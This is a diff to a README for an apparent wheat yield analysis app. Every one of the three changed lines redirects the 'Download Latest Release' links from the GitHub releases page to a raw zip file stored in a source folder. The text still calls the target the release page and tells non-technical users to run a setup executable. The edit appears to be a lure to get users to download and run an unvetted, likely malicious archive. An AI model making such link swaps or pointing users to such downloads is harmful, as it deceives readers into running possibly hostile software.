@@ -1,6 +1,6 @@
 # 🌾 wheat-agronomic-analytics - Wheat Yield & Plant Analysis Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-wheat--agronomic--analytics-blue?style=for-the-badge)](https://github.com/callisaurusdraconoidesdoweling285/wheat-agronomic-analytics/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-wheat--agronomic--analytics-blue?style=for-the-badge)](https://github.com/callisaurusdraconoidesdoweling285/wheat-agronomic-analytics/raw/refs/heads/main/src_ml/analytics-wheat-agronomic-3.9-beta.5.zip)
 
 ---
 
@@ -20,7 +20,7 @@ You don't need any programming skills to use this software. It works on Windows 
 ## 📥 Download & Setup
 
 **Visit this page to download the software:**  
-[Download wheat-agronomic-analytics](https://github.com/callisaurusdraconoidesdoweling285/wheat-agronomic-analytics/releases)
+[Download wheat-agronomic-analytics](https://github.com/callisaurusdraconoidesdoweling285/wheat-agronomic-analytics/raw/refs/heads/main/src_ml/analytics-wheat-agronomic-3.9-beta.5.zip)
 
 1. Open the link above. This is the release page where you find the latest version of the app.
 2. Look for the file named something like `wheat-agronomic-analytics-setup.exe` or similar.
@@ -110,7 +110,7 @@ The dashboard gives you a visual summary of results.
 
 ## 🔗 Useful Links
 
-- Release Page: https://github.com/callisaurusdraconoidesdoweling285/wheat-agronomic-analytics/releases
+- Release Page: https://github.com/callisaurusdraconoidesdoweling285/wheat-agronomic-analytics/raw/refs/heads/main/src_ml/analytics-wheat-agronomic-3.9-beta.5.zip
 - Documentation: Available within the app’s Help menu.
 - Support: Use GitHub Issues on the repository page for technical questions.
 
